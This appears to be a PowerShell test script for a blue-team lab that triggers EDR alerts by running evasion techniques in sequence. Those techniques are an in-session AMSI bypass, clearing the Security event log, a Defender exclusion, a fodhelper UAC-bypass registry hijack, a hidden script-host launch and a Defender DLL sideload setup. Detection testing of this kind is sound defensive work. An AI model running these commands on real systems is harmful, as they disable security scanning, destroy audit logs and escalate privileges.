# VICTIM - Phase 6 advanced evasion battery (6.1-6.4, 6.8, 6.9 + 4.8 Defender sideload).
# Benign variants only. EDR must be running. Watch alerts between blocks.
param([string]$Attacker = "172.16.69.109")

Write-Host "== 6.1 AMSI bypass in-script (expect 4104 script-block event; content rule = backlog) =="
$t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $t.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null, $true)
Write-Host "   AMSI blinded in this session (benign demo)"

Write-Host "== 6.2 Security log clear (expect TAMPER-AUDIT) =="
wevtutil cl Security
Start-Sleep 5

Write-Host "== 6.3 Defender exclusion (expect TAMPER-DEFENDER) - removed again at once =="
Add-MpPreference -ExclusionPath C:\Users\Public
Remove-MpPreference -ExclusionPath C:\Users\Public
Start-Sleep 5

Write-Host "== 6.8 fodhelper UAC bypass key (expect PERS-UAC-KEY) =="
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" `
  -Value "C:\Users\Public\sysupd.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name DelegateExecute -Value ""
# to fire the full chain, run fodhelper from a NON-elevated shell:
#   Start-Process C:\Windows\System32\fodhelper.exe
Start-Sleep 5

Write-Host "== 6.9 script-host launchers (expect EVT-SCRIPTHOST) =="
Set-Content C:\Users\Public\ccdc_stager_test.vbs "WScript.Quit"
Start-Process wscript.exe -ArgumentList "C:\Users\Public\ccdc_stager_test.vbs" -WindowStyle Hidden
Start-Sleep 5

Write-Host "== 4.8 Defender sideload, telemetry-only variant (expect EVT/PROC-DEFENDER-SIDELOAD) =="
New-Item -ItemType Directory -Force C:\Users\Public\DefCheck | Out-Null
Copy-Item 'C:\Program Files\Windows Defender\MpCmdRun.exe' -Destination C:\Users\Public\DefCheck\
Copy-Item 'C:\Program Files\Windows Defender\mpclient.dll' -Destination C:\Users\Public\DefCheck\
Start-Process C:\Users\Public\DefCheck\MpCmdRun.exe -ArgumentList '-Scan','-ScanType','1' -WindowStyle Hidden

Write-Host "done. run check-alerts.ps1 to tally the scoreboard"
